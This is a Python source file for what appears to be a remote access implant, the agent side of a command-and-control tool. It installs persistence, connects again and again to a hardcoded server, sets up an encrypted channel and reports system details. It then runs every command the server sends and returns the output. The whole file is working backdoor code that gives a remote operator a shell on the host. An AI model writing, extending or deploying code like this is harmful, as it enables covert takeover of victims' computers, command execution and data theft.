import os
import socket
import time
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes, serialization
from system_info import get_system_info
from shell import run_command
from helper import send_secure_json, receive_secure_json
from persistence import setup_persistence


SERVER_HOST = "192.168.10.150"
SERVER_PORT = 8080
SEND_HEARTBEAT_INTERVAL = 180
RETRY_CONNECT_INTERVAL = 10
EXE_LOCATION, AGENT_ID_LOCATION = setup_persistence()  # Setup persistence and return exe and agent ID locations.
KEY_LENGTH = 32


def read_uuid() -> str | None:
    if os.path.exists(AGENT_ID_LOCATION):
        with open(AGENT_ID_LOCATION, "r") as f:
            data = f.read()
            if data:
                return data
            else:
                return None

    return None

def communicate(s: socket.socket, system_info: dict) -> None:
        while True:
            # Send agent-public-key message.
            private_key = X25519PrivateKey.generate()
            public_key = private_key.public_key().public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw)
            s.send(public_key)

            # Receive server-public-key message.
            server_public_key = s.recv(KEY_LENGTH)
            shared_key = private_key.exchange(X25519PublicKey.from_public_bytes(server_public_key))
            derived_key = HKDF(
                algorithm=hashes.SHA256(),
                length=KEY_LENGTH,
                salt=None,
                info=b'handshake data',
            ).derive(shared_key)

            # Construct agent hello message
            agent_hello = system_info
            agent_hello["type"] = "agent-hello"

            # Read agent_id
            agent_id = read_uuid()
            if agent_id:
                agent_hello["agent_id"] = agent_id

            # Send agent hello message
            send_secure_json(s, derived_key, agent_hello)

            # Receive server hello message
            server_hello = receive_secure_json(s, derived_key)
            if server_hello.get("type") != "server-hello":
                continue

            # Save to file received agent_id
            with open(AGENT_ID_LOCATION, "w") as f:
                f.write(server_hello["agent_id"])

            while True:
                try:
                    message = receive_secure_json(s, derived_key)

                    if message.get("type") == "request":
                        response_tuple = run_command(message.get("command"))
                        response = {
                            "type": "response",
                            "response_id": message.get("request_id"),
                            "response": response_tuple[0],
                            "cwd":  response_tuple[1],
                        }
                        send_secure_json(s, derived_key, response)

                except socket.timeout:  # If socket timeout, send heartbeat
                    message = {
                        "type": "heartbeat",
                    }
                    send_secure_json(s, derived_key, message)
                    print("Heartbeat sent.")

def connect_to_server() -> socket.socket:
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            print("Connection established.")
            return s
        except socket.error:
            print(f"Failed to connect to server, retrying in {RETRY_CONNECT_INTERVAL} seconds.")
            time.sleep(RETRY_CONNECT_INTERVAL)


def main() -> None:
    s = connect_to_server()
    s.settimeout(SEND_HEARTBEAT_INTERVAL)

    try:
        communicate(s, get_system_info())
    except ConnectionResetError or ConnectionAbortedError or ConnectionRefusedError:
        print("Socket closed.")
    except Exception as e:
        print(e)
    finally:
        s.close()
        main()

if __name__ == '__main__':
    main()
